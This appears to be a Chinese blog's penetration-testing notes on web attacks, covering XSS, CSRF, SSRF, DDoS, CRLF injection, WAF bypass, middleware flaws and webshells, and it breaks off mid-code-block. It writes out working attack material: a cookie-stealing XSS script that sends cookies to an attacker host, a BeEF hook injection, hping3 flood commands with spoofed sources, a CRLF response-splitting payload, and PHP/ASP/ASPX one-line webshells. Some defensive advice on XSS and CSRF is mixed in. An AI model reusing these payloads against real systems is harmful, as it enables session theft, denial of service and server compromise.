![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710223335774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

##### xss的fuzz字段

https://xssfuzzer.com/fuzzer.html
https://github.com/foospidy/payloads/tree/master/other/xss
https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
新型绕过
http://www.jsfuck.com/

#### XSS常出现位置

只要有允许用户输入数据的，且后端没有接受过滤的就存在xss攻击比如对你的用户名展示，对你输入的东西展示。常见出现在：

 - 表单框：搜索框、文本编辑框、留言框
 - html参数：具体参数、页码
 - 网站callback：访问ip回显、上传文件未经过过滤直接回显到界面
 - 文件名、用户名
 - 跳转 https://www.test.com/?redirect_to=jav ascript:alert('XSS');




### XSS漏洞利用

#### 窃取 cookie

窃取 cookie是利用 XSS 的传统方法。大多数 Web 应用程序使用 cookie 进行会话处理。您可以利用跨站点脚本漏洞将受害者的 cookie 发送到您自己的域，然后手动将 cookie 注入您的浏览器并冒充受害者。

虽然盗取cookie是目前来看最流行的xss应用场景，但是这个触发条件也比较苛刻。一般这种攻击需要肯定对方大概率会查看你的页面

*  受害者可能没有登录。
*  许多应用程序使用该HttpOnly标志对 JavaScript 隐藏其 cookie 。
*  会话可能会被其他因素锁定，例如用户的 IP 地址。
*  会话可能会在您能够劫持它之前超时。



```python
<script>document.write('<img src="http//<YourIP>/Stealer.php?cookie='%2B document.cookie %2B '"/>');</script>
```

强制下载

```bash
<script>var link = document.createElement('a'); link.href ='http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe'; link.download = '';document.body.appendChild(link); link.click();</script>
```

重定向

```bash
<script>window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";</script>
```


#### xss平台

如果你搞的东西比较敏感，不希望别人知道也可以自己搭建一个。目前国内几款xss平台使用规则都差不多，通常总有延迟等问题，不是很好用
自己写类似于如下，一个文件用于触发，另一个文件用于接收。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710003925868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710004151205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



以下为链接为  https://xsshs.cn 的平台，其他XSS平台使用类似
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210607221344762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
一般选默认，默认是获取cookie。也不要太多模块都勾选，非常非常容易导致JS报错，如果报错，那么可能你就收不到对方的中招信息了。尽量只勾选一个或两个。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210607221517840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
最后XSS平台就会告诉你怎么样执行代码了。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210607221902641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)   



xss获取后台二级密码 – URL跳转 (地址栏不变)    https://woj.app/1820.html

后台(内网)打穿神器→xss蠕虫    https://woj.app/2173.html

xss平台持久cookie说明 keepsession说明    https://woj.app/1907.html

不用cookie 一个储存XSS对“某btc平台”攻城略地  https://woj.app/3035.html








#### beef-xss

打开kali，执行`beef-xss`
命令行启动之后，开启beef终端。默认帐号密码是：beef/beef
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071013163322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
这时候啥都干不了，是因为你有一步很重要的操作没做。这里需要把payload复制粘贴到你的目标xss的位置，然后将其中的<IP>改成你这台kali的IP地址，最终payload为：<script src="http://X.X.X.X:3000/hook.js"></script>
改完之后，会发现online browers中多了点东西，这时候就可以开始操作了

beef还是很强大的，入侵成功后可以对对方页面进行跳转或者一些社工
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710132101331.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


使用方法就是使用XSS攻击能在页面中插入类似下面的语句就可以了。

```bash
<script src="http://127.0.0.1:3000/hook.js"></script>
```


### XSS防御

在某些情况下，防止跨站点脚本编写是微不足道的，但根据应用程序的复杂性及其处理用户可控数据的方式，可能会更加困难。

一般来说，有效防止XSS漏洞很可能涉及以下措施的组合：

* 输入过滤：特殊字符过滤、特殊字符转义、长度限制。在php中常使用htmlentities和ENT_QUOTES为 HTML 上下文转义您的输出，或为 JavaScript 上下文转义 JavaScript Unicode 转义。在java中常使用 Google Guava 等库对 HTML 上下文的输出进行 HTML 编码，或对 JavaScript 上下文使用 JavaScript Unicode 转义。
* 对输出的数据进行编码。在 HTTP 响应中输出用户可控数据时，对输出进行编码以防止其被解释为活动内容。根据输出上下文，这可能需要应用 HTML、URL、JavaScript 和 CSS 编码的组合。
* 使用适当的响应头。使用Content-Type和X-Content-Type-Options标头来确保浏览器以您想要的方式解释响应。xss-proretion参数；http-only（防御xss的cookie盗取，你可以破解此防御的方案之一是采用CRLF做分割）
* 内容安全政策（具体见备注）。作为最后一道防线，您可以使用内容安全策略 (CSP) 来降低仍然发生的任何 XSS 漏洞的严重性。

 备注:**内容安全策略 ( CSP )** 是一种浏览器机制，旨在减轻跨站点脚本和其他一些漏洞的影响。如果使用 CSP 的应用程序包含类似 XSS 的行为，则 CSP 可能会阻碍或阻止对该漏洞的利用。通常，可以绕过 CSP 以利用底层漏洞。

### 关于XSS的常见问题

XSS 漏洞有多常见？XSS 漏洞非常普遍，XSS 可能是最常出现的 Web 安全漏洞。

XSS 攻击有多常见？很难获得关于真实世界 XSS 攻击的可靠数据，但与其他漏洞相比，它的利用频率可能较低。

XSS 和 CSRF 有什么区别？XSS 涉及导致网站返回恶意 JavaScript，而 CSRF 涉及诱导受害用户执行他们不打算执行的操作。

反射型XSS 和DOM型区别是什么？都是未存储到数据库的，都是一次性的。但是反射型的数据有经过后端，比如查询的xss会经过被带到后端校验，而DOM型是单纯前端单纯客户端的

### XSS学习资源

**靶场**
[xss-lab](https://github.com/rebo-rn/xss-lab)与[答案](https://www.cnblogs.com/wangyuyang1016/p/13532898.html#_caption_3)
burp的xss实验室[答案1重要步骤详细](https://www.freebuf.com/articles/web/289478.html)和[答案2的个人试错总结更多](https://cloud.tencent.com/developer/article/1806351)

## 跨站请求伪造 (CSRF）

### 什么是CSRF？

跨站请求伪造（也称为 CSRF）是一种 Web 安全漏洞，允许攻击者诱使用户执行他们不打算执行的操作。它允许攻击者部分规避旨在防止不同网站相互干扰的同源策略。

###  CSRF 攻击的影响是什么？

只要受害者在登录状态，点击了一下你的恶意链接，或者你在网页中内嵌了渲染代码(恶意网站的链接可以包含有效的HTML， <imgsrc=”www.malicious_site.com”>  ，并且并不需要 受害者点击链接)也可以完成攻击。

CSRF通常可以用来以目标用户的名义发邮件、盗取目标用户账号、购买商品。通常用来做蠕虫攻击、刷SEO流量等。

### CSRF 攻击前提是什么？

要使 CSRF 攻击成为可能，必须具备三个关键条件：

* 一个相关的动作。应用程序中存在攻击者有理由诱导的操作。这最好是特权（否则是普通操作即便存在csrf也没什么意义）操作（例如选择可以添加用户删除、修改等操作上）或对用户特定数据的任何操作（例如更改用户自己的密码）。
* 基于 Cookie 的会话处理。执行该操作涉及发出一个或多个 HTTP 请求，应用程序仅依赖会话 cookie 来识别发出请求的用户。没有其他机制来跟踪会话或验证用户请求。
* 没有不可预测的请求参数。执行操作的请求不包含攻击者无法确定或猜测其值的任何参数。例如，当导致用户更改其密码时，如果攻击者需要知道现有密码的值，该函数就不容易受到攻击。

### 如何构建CSRF攻击？

**检测是否存在csrf漏洞**
修改csrf,repeater包，如果存在4XX状态码说明此修改不合适或不存在csrf漏洞
如果302跳转说明存在攻击
**构造poc**
![在这里插入图片描述](https://img-blog.csdnimg.cn/0d33e519fa6e4c2f85e56913cee2b20e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5YyX5LiQ5a6J5YWo,size_19,color_FFFFFF,t_70,g_se,x_16)


### CSRF 防御方式有哪些？

最有效的和简洁的手段是用csrf token，如果你发现对方的网站有csrf token那么你基本就没必要认为对方有csrf漏洞了
由于防御方法简单且难以被绕过，因此现在这种漏洞在大型网站几乎没有，小型网站你要想用此攻击获取普通用户的还是比较好搞，但是要想获取管理员的，你必须知道管理员请求数据包的方式。

* 当用户发送重要的请求时需要输入原始密码
* 对cookie生成csrf随机校验值，每次请求带上此值（有时候是在html表单提交时隐藏了此值）
* 

```bash
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLmcsrf=WfF1szMUHhiokx9AHFply5L2xAOfjRkE&email=wiener@normal-user.com# 隐藏值在使用 POST 方法提交的 HTML 表单的隐藏字段内将令牌传输到客户端<input type="hidden" name="csrf-token" value="CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz" />
```

* 检验referer来源，请求时判断请求连接是否为当前管理员正在使用的页面(管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败)
* samesite cookie防御

```bash
# SameSite=Strict 时浏览器将不会在源自其他站点的任何请求中包含 cookie# 这是最具防御性的选项，但它会损害用户体验，因为如果登录用户通过第三方链接访问某个站点，那么他们将显示为未登录，并且需要在此之前重新登录以正常方式与网站互动。Set-Cookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Strict;# SameSite=Lax 时浏览器会将 cookie 包含在源自另一个站点的请求中，但前提是满足两个条件：# 该请求使用 GET 方法。使用其他方法（例如 POST）的请求将不包含 cookie。【大部分csrf都是post请求所以可以防范、许多应用程序和框架都可以容忍不同的 HTTP 方法。在这种情况下，即使应用程序本身设计使用 POST 方法，它实际上也会接受切换为使用 GET 方法的请求。】# 该请求由用户的顶级导航（例如单击链接）产生。其他请求，例如由脚本发起的请求，将不包含 cookie。Set-Cookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Lax;
```

### CSRF 反防御方式有哪些？

**CSRF TOKEN配置错误**

* csrf token值置空
* csrf token整个参数置空（不仅仅是它的值）
* 更改请求方式POST改为GET，GET改为POST
* 两个登录账户，复用一个csrf token（csrf是一次性的但与session未绑定会导致此错误）

## 模板注入

模板引擎是允许开发者或设计师在创建动态网页的时候，从数据展示中分离编程逻辑的工具，模板引擎由于其模块化和简洁的代码与标准 HTML 相比而被更频繁地使用。模板注入是指用户输入直接传递到渲染模板，允许修改底层模板

## SSRF

这个漏洞比CSRF难防范得多，一些大型网站甚至在稍微不注意的时候都会留下这个漏洞。
SSRF 漏洞允许你可以执行以下操作：

> 在回环接口上访问服务
> 扫描内部网络和与这些服务的潜在交互方式GET/POST/HEAD）
> 使用 FILE:// 读取服务器上的本地文件
> 使用 AWS Rest 接口（ http://bit.ly/2ELv5zZ ）
> 横向移动到内部环境中
> 还可以利用其漏洞打穿内网添加管理员或远程下载一个木马

找真实站点搜索关键词：上传网络图片  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210711014602709.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


### 常见攻击

如果对方的网站可以直接链接到别的网站的入口，而本身界面又还是自身网站就可能存在此漏洞

#### 图片上传

图片上传一般允许本地上传（SSRF在本地上传图是没有漏洞的）或者远程上传即访问类似于http://djhsds.img，远程上传的图意味着你访问了这个链接，所以这时候当你将地址换成内部地址时，意味着这个页面会展示很多内部信息。如下请求了一个内网地址端口，这个内网ip通常是要你自己用字典跑的，但是不要紧，内网ip也就这么几百个：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210711020338432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
除了探测信息以外，你要是发现漏洞了还可以直接执行漏洞代码
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210711024415355.png)
跑完ip再跑端口。
通常你在测试图片上传时会测试以下几种类型的反馈结果
http://对方内网ip/phpmyadmin
dict://对方内网ip:3306/info
ftp://对方内网ip:21


## DDOS 攻击

即分布式拒绝服务（DDoS，Distributed Denial of Service） 攻击。此攻击是通过耗尽目标对象资源来达到攻击效果,攻击类型与扫描方法类似



### DDOS 攻击手段

1）TCP
客户端一直没有给服务器端发送ACK报文，而是一直不断地向服务器端发送连接请求，导致服务端忙于处理批量的连接请求

2）UDP
向目标端口发送大量无用的UDP报文来占满目标的带宽，导致目标服务器瘫痪。

```bash
hping3 --udp  --flood -p 80 --rand-source 想测试的IP
```

3）HTTP
客户端产生大量http访问请求 

4）ICMP
大量ping请求

```bash
hping3 --icmp  --flood -p 80 --rand-source 想测试的IP
```

5)SYN
发送大量无情的SYN包。
如下是攻击代码，在kali中执行
-S 表示发送的是SYN包
–flood 表示以洪水的方式发送，就是拼了命地发
–rand-source 是随机伪造源IP
-p 80 指定端口号为80

```bash
hping3 --syn  --flood -p 80 --rand-source 想测试的IP
```

## 待补充：劫持漏洞

### DNS劫持

DNS 记录指向的资源无效，但记录本身尚未从 DNS 清除，攻击者可以借此实现 DNS 劫持。 
帮助检测DNS工具有：
tko-subs
HostileSubBruteforcer
autoSubTakeover

### HTTP劫持

### DLL劫持

## 攻击漏洞技巧

### CRLF 注入

HTTP响应拆分漏洞，也叫CRLF注入攻击。CR、LF分别对应回车（%0d）、换行（%0a）字符。HTTP头由很多被CRLF组合分离的行构成，每行的结构都是“键：值”。如果用户输入的值部分注入了CRLF字符，它有可能改变的HTTP报头结构。
一般在源码中存在将你请求的数据设置为数据包一部分、又不过滤情况就存在此漏洞。更多请看https://zhuanlan.zhihu.com/p/140702316

**简介**
难度：低

通常用在：分享链接
拓展思路：对客户端的攻击，比如投票、跳转、关注等；
绕过安全防护软件；


**实战**

测试链接：

会话固定、XSS、缓存病毒攻击、日志伪造

### 宽字节注入

只要发现使用gbk，韩文、日文等编码时就可以考虑可能存在宽字节注入漏洞。

在%df遇到%5c时，由于%df的ascii大于128，所以会自动拼接%5c，吃掉反斜线。而%27 %20小于ascii(128)的字符就会保留。通常都会用反斜线来转义恶意字符串，但是如果被吃掉后，转义失败，恶意的xss代码可以继续运行。
反斜杠的GBxxx编码为%5C，根据GBxxx编码在前面加上%DE，%DF，%E0。。。都可以组成一个汉字，从而把反斜杠这个转义字符给吃了
%27---------单引号

%20----------空格

%23-----------#号

%5c------------/反斜杠

php中有一个转义字符


# 绕过检测

你虽然总希望一开始就万剑闪过的绕过防御，但你总不是这么幸运的，通常要不断的尝试。在内网渗透时有时候你还可以故意用一个出名的如Mimikatz来留下痕迹，进而开始触发报警，蓝队在发现我们使用的默认/基础恶意软件（或者仅仅进行了轻微的混淆）时就会将此视为胜利，但我们的真正目的是了解他们的环境。

## 待补充：免杀

## WAF绕过

很多web都有WAF，会对恶意访问者做一定的拦截和记录。你在测试你的危险语句时，遭遇waf第一步是不要惊慌，一点一点的测试是因为匹配到了语句中的哪个词组或符号组被拦截了。
在学习WAF绕过时，最深度学习的方式是将想分析的WAF下载到电脑，弄一个网站，开着WAF自己跟自己玩。
[绕过工具，分块传输](https://github.com/c0ny1/chunked-coding-converter)

**waf类型**

硬件、软件、云
**waf检测工具**

1. wafw00f
2. sqlmap
   相较于手工和wafw00f而言，sqlmap业界认可度更高，用的人更多

```bash
sqlmap.py -u "url" --identify-waf --batch
```


**简单概述WAF绕过**
WAF绕过将会更难了，这些绕过都是有条件的。

1.扫描速度（代理池，延迟，白名单）
2.工具指纹（特征指纹，伪造模拟真实是用户）
3.漏洞payload（数据变异，数据加密，白名单）
	碰到WAF多换几个工具
	代理发送burpsuite，鼠标点击器扫


# 经验积累

## 漏洞出现在？

挖漏洞关键：跳出思维框架

### URL参数

#### 经验

每个url参数都意味着可测试
如果可以追溯参数传递到哪里

#### 出现在：参数可渲染

```bash
url?error=你想打印在屏幕话# 知道参数会传递将参数补充危险命令## 假设知道参数会以下方式传递<? $val=htmlspecialchars($_GET['par'],ENT_QUOTES); ?> <a href="/page.php?action=view&par='.<?=$val?>.'">View Me!</a>## 添加危险参数http://host/page.php?par=123%26action=edit
```

#### +http参数污染

```bash
# 附加参数toAccount=9876&amount=1000&fromAccount=12345&toAccount=99999
```

#### +CRLF

%0d%0a  是 CRLF。一定要寻找这样的机会，其中站点接受你的输入，并且将其用于返回协议头的一部分（比如某些参数用于创建cookie）。如果存在，进一步尝试使用 XSS 注入来组合盖漏洞

```bash
%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20te\xt/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<script>alert(dshdjs)</script>
```

#### +xss

检查参数是否接受JS代码

#### +开放重定向

检查参数是否接受外部链接
常见关键词 redirect_to=  ， domain_name=  ， checkout_url= 

### 嵌入网站元素

#### +xss

### 数据包参数

#### 置空

```bash
# 验证码、cookie等置空# 逻辑漏洞，删除提醒使用完全访问权限的账号登录 Shopify 移动应用拦截 POST /admin/mobile_devices.json  的请求移除该账号的所有权限移除添加的移动端提醒重放 POST /admin/mobile_devices.json  的请求
```

#### 修改信号

```bash
你会注意到有个 <iframe>  标签包含 PIN 参数。这个参数实际上就是你的账户 ID。下面，如果你编辑了 HTML，并且插入了另一个 PIN，站点就会自动在新账户上执行操作
```

### 重复发包

重放
竞态

### 文件上传

#### +xxe

## 中间件

中间件即是一种独立的系统软件或服务程序，分布式应用软件借助这种软件在不同的技术之间共享资源。

### IIS

**介绍**
IIS是只适用于windows的中间件

**安装**
如何安装很简单，略。
但是值得多指出的一点是，这不想装编程语言版本随便切换，就目前的狀況來說，你要用 IIS 8 (非 Express) 就一定要升級到 Windows 8 以上才行，Windows 8.1 是 IIS 8.5，Windows 10 是 IIS 10，因為 IIS 和作業系統是整合的元件，它也沒有釋出可轉散布的安裝檔。

**待补充：漏洞**
PROPFIND 栈溢出漏洞
RCE CVE-2017-7269
PUT任意文件写入

### JAVAWEB

                (1) Springboot：                   github上一份整理得比较好的SpringBoot的checklist：https://github.com/LandGrey/SpringBootVulExploit                   其他链接：                           https://blog.gdssecurity.com/labs/2018/4/18/jolokia-vulnerabilities-rce-xss.html                           https://www.veracode.com/blog/research/exploiting-spring-boot-actuators                           https://github.com/mpgn/Spring-Boot-Actuator-Exploit                   关于springboot引入devtools时的特定条件下的反序列化漏洞利用，可参考：https://xz.aliyun.com/t/8349              (2) JBoss：                        https://github.com/joaomatosf/jexboss             (3) struts2：                       https://github.com/HatBoy/Struts2-Scan                       K8哥哥写的struts2图形化利用工具：其个人网站：http://k8gege.org/p/72f1fea6.html             (4) Tomcat：                       https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi             (5) ThinkPHP：                       https://github.com/admintony/thinkPHPBatchPoc.git             (6) PHP-FPM                      https://github.com/neex/phuip-fpizdam             (7) solr                   https://github.com/Imanfeng/Apache-Solr-RCE

Weblogic系列漏洞：弱口令 && 后台getshell、SSRF漏洞、反序列化RCE漏洞

Jboss系列漏洞：未授权访问Getshell、反序列化RCE漏洞

Tomcat系列漏洞：弱口令&&后台getshell、Tomcat PUT方法任意写文件漏洞

Websphere系列漏洞：弱口令&&后台getshell、XXE漏洞、远程代码执行漏洞

Coldfusion系列漏洞：文件读取漏洞、反序列化RCE漏洞

GlassFish系列漏洞：弱口令&&后台getshell、任意文件读取漏洞

Resin系列漏洞：弱口令&&后台getshell、任意文件读取漏洞

Redis系列漏洞：未授权访问getshell、主从复制RCE

ActiveMQ系列漏洞：ActiveMQ任意文件写入漏洞、ActiveMQ反序列化漏洞

Kafka系列漏洞：未授权访问漏洞、反序列化漏洞

Elasticsearch系列漏洞：命令执行漏洞、写入webshell漏洞

ZooKeeper系列漏洞：未授权访问漏洞框

### Apache

 Solr系列漏洞

　　XML实体注入漏洞、文件读取与SSRF漏洞、远程命令执行漏洞
　　Jackson系列漏洞

　　反序列化RCE漏洞
Dubbo 系列漏洞

　　Dubbo 反序列化漏洞、Dubbo 远程代码执行漏洞


### Nginx

### Shiro

　　Shiro 默认密钥致命令执行漏洞、Shiro rememberMe 反序列化漏洞（Shiro-550）
　　Shiro Padding Oracle Attack（Shiro-721）

### tomcat

### struct2

漏洞扫描工具 https://github.com/HatBoy/Struts2-Scan

S2-001到S2-061漏洞
安全公告：https://cwiki.apache.org/confluence/display/WW/Security+Bulletins

## 组件



知名的第三方工具网上是有专门的扫描器的，这相比于通用的扫描得会更及时更经常。如果没有你就想办法弄源码下来，弄到之后先采用一键代码设计软件进行扫描漏洞，扫描不出就去看看源码找0day

如果对方完全用框架去搭建的，那么它的安全验证/漏洞就会完全来自框架。如果是半开发的漏洞就通常采用常规测试

### 敏感信息搜集

**搜索引擎搜敏感词**
框架+爆破目录
框架+漏洞利用/拿shell
框架+弱口令

**github**
框架+历史漏洞 github
框架github看发布修复了哪些漏洞，就大概能对历史漏洞有全貌了解
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718135824694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
发现相关漏洞之后进入commit就知道这个漏洞到底发生在哪些语句
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718140015986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### 工具

#### 利用

wordpress:wpscan(kali内置)
thinkphp:thinkphppayload

#### 弱口令

snetcraker:国内开发的，使用起来简单,但仅支持远程协议的爆破破解如mysql，redis等。如果是网页登录需要用burpsuit爆破提交数据包的
hydra:国外开发的，kali集成

### thinkphp5

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071812320635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
启动界面如图所示  :）![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718123314499.png)

#### 特性

**访问调用**
支持在url访问文件的函数，写法是url/文件名（如果是index.php可以省略不写）/目录
/类名（没有类可忽略）/函数名
支持在url访问文件的参数，写法是url/文件名/目录
/类名（没有类名可忽略）/函数名/参数名/1

以上方法定义的访问一般至少网页url层有3层。如果是定义路由route文件,重新自定义了访问，访问就更隐蔽了，如下是一个route.php文件的定义。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718132543794.png)


利用好上述特性，你在访问时就可以直接调用内在函数

**开启调试模式**
直接在config中就可以开启调试，这为审计提供了便利。一般在审计时通常会开启，开启方法很简单都以下两个值都设置为true
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718130329347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718133002578.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

****

利用tp5的特性在代码审计时，应先查看route文件，再将调试打开，以最快的定位页面文件位置

#### 历史漏洞

tp5历史漏洞 https://github.com/Mochazz/ThinkPHP-Vuln


### dedecms

#### 基本信息

介绍市场份额、经典界面、漏洞、平台更新速度、版本差别

#### 敏感信息

**后台目录**
/dede
更多请看http://wap.dedexuexi.com/dedejiaocheng/azsy/1136.html


## 语言特性

### PHP



#### 变量覆盖漏洞

顾名思义，自定义的变量替换原有变量的情况称为变量覆盖漏洞

主要涉及的函数有以下四个：

```bash
extract() parse_str() import request variables() $$
```

如果GET的传参允许被变量，那么通常会配合文件包含或SQL注入拿到隐秘的东西。比如metinfo有类似的漏洞。

extract()函数导致的变量覆盖
extract()该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每一个元素，将在当前符号表中创建对应的一个变量

parse_str函数导致的变量覆盖问题
parse_str()函数用于把查询字符串解析到变量中，如果没有array参数，则由该函数设置的变量
将覆盖已存在的变量名

import_request_variables()使用不当
import_request_variables将GET/POST/COOKIE变量导入到全局作用域中
import_request_variables()函数就是把GET、POST、COOKIE的参数注册成变量，用在register_globals被禁止的时候 

### JAVAWEB

你可以阅读《java代码审计入门》免费阅读[链接](https://weread.qq.com/web/reader/c8732a70726fa058c87154bkc81322c012c81e728d9d180)
更多请查看《攻击javaweb应用》





## 蜜罐

蜜罐技术本质上是一种对攻击方进 欺骗的技术，通过布置一些作为诱饵的主机、网络服务以及操作系统等，诱使攻击方对它们实施攻击，从而可以捕获攻击行为进行分析、溯源、反制等操作。

了解攻击方所使用的工具与方法，推测攻击意图和动机，能够让防御方清晰地了解他们所面对的安全威胁，并通过技术和管理手段来增强实际系统的安全防护能力。

蜜罐是企业内部私有的情报收集系统。通过对蜜罐本身的设定以及蜜饵的铺洒与运营引诱黑客前来攻击。所以攻击者触碰陷阱时，你就可以知道他是如何得逞的，随时了解针对服务器发动的最新的攻击和漏洞。还可以通过窃听攻击之间的联系，收集黑客所用的种种工具，最终掌握他们的攻击路径与手法，知己知彼。

****

比较知名的有：hfish
蜜罐项目汇总 https://github.com/paralax/awesome-honeypots/blob/master/README_CN.md


**防止掉入蜜罐**

匿名者需要额外小心，很多时候一不小心点了红队传送的URL，那么我们就很可能被JSONP蜜罐直接获取社交号或者被抓到真实的出口IP

**识别蜜罐**

**欺骗蜜罐**

当我们识别出蜜罐，有以下方式来做反攻：

>①投喂大量脏数据
>
>②伪造反向蜜罐，诱导红队进入并误导溯源并消耗红队的精力

## Webshell

一句话木马是最简单的webshell，基本实现思想是把后门数据包的东西当做恶意代码执行。但很多网站已经对一句话木马做防范了，因此通常这些木马要经过一定变形修改才上传，不然可能被封IP

asp一句话木马：

```bash
<%execute(request("value"))%>
```

php一句话木马：

```bash
<?php @eval($_POST['x'])?>
```

aspx一句话木马：

```bash
<%@ PageLanguage="Jscript"%><%eval(Request.Item["value"])%>
```


待补充：利用msfvenon生成木马、不死马




# 系统漏洞

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071422384836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

## 工具

### 探测工具简介

**nmap**

namp --script=vuln 默认nse插件，扫描有局限，如果要用nmap扫描一般要用第三方比如vulscan或vulners。将国外知名的漏洞文件放在vulscan目录下，这些工具就会去自动识别读取漏洞，所以扫描就会全。具体怎么用，等我以后有空详解。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714232851858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
占位符，未经详细测试nmap vulscan与 nessus性能差别。

**nessus**
点击新建项目后来到下面这个界面，在用一般会点的高级扫描
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071423333457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714234445162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### EXP工具

##### Metasploit

如果你是第一次使用这个工具，那么工具的可视化界面将对你更友好，更加熟悉msf目录结构。

```bash
# 初始化msfdb数据库。如果你不用这个命令直接执行可视化系统仍旧会指导你先进行初始化msfdb initbarmitage
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210522014217527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


**基础使用方法**
msf
以smb为例

```bash
